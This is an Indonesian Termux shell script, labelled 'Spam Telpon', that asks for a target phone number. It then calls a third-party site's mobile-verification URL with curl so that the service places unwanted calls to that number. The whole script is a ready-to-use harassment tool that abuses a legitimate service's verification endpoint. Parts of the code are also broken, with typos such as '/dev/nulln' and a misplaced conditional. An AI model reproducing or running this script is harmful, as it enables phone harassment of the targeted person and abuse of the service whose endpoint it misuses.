#!bin/sh
#mau ngapain om
#mau recode y
#recode aja gpp kok
#tapi donasi duluya

spin () {

local pid=$!
local delay=0.25
local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[34m\r[*] Downloading..please wait.........\e[33m[\033[32m$i\033[33m]\033[0m   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "\e[1;33m [Done]\e[0m";
echo "";

}


echo "$green install package"
(apt update && apt upgrade) &> /dev/null & spin;
(pkg install git toilet figlet nano python python2 python3 bash && gem install lolcat) &> /dev/nulln
sleep 1
echo "selesai"
clear
white="\e[97m";
black="\e[1m";
yellow="\e[93m";
orange="\e[38m";
blue="\e[34m";
lblue="\e[36m";
green="\e[92m";
fgreen="\e[32m";
red="\e[91m";
magenta="\e[35m";
bluebg="\e[44m";
lbluebg="\e[106m";
greenbg="\033[42m";
lgreenbg="\e[102m";
yellowbg="\e[43m";
lyellowbg="\e[103m";
redbg="\e[101m";
grey="\e[37m";
cyan="\e[36m";
bold="\e[1m";
kosong="\e[0m";

ask="\e[97m[ \e[91m?\e[97m ] ";
err="\e[97m[ \e[93m!\e[97m ] ";
suk="\e[97m[ \e[92m+\e[97m ] ";

echo " $green•$yellow============================================$greem•	"
echo " $blue Author	   :$cyan Kafid_Renaldo          	"
echo " $blue github	   :$cyan github.com/kafidrenaldo	"
echo " $green•$yellow============================================$green•	"
echo "$err $red info					"
echo "$redbg $cyan $bold batas spam : 03"
echo "   tidak bisa pake 08/+62"
echo "   Example:885876xxxxx$kosong"
echo
toilet -f small -F gay 		Spam Telpon
echo 
echo "$green [ $lblue 01 $green ] $grey $bold spam-telp"
echo "$green [ $lblue 02 $green ] $grey $bold Exit tools"

echo
read -p "$ask masukan pilihan anda : " pil
if [ $pil = 1 ] || [ $pil = 01 ]; then
read -p "$ask masukan no target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
echo "$suk Spam Telepon Akan Segera Dikirim Mohon Tunggu"
echo "$suk untuk menghetikan spam tekan "ctrl + c / ctrl + z" "
echo "$yellow•$green=============================================$yellow•$kosong"
curl -s $link 
echo "$yellow•$green=============================================$yellow•$kosong"

if [ $pil = 2 ] || [ $pil = 02 ]; then
echo 'terima kasih udah pake tools gue'
exit
fi
else
    echo "$err $bold Input Salah..$red!!!"
    sh spam-telp.sh
    fi
